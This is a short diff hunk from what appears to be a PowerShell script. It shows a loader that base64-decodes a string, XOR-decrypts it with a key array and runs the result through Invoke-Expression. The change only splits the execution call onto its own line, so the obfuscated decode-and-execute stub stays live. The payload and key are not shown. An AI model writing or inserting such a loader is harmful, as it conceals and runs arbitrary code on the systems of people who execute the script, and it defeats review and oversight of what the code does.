@@ -5,4 +5,5 @@ Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch {
 $i = 0;
 $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
 $i++; 
-if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+if ($i -eq $xor.Length) {$i = 0} };
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
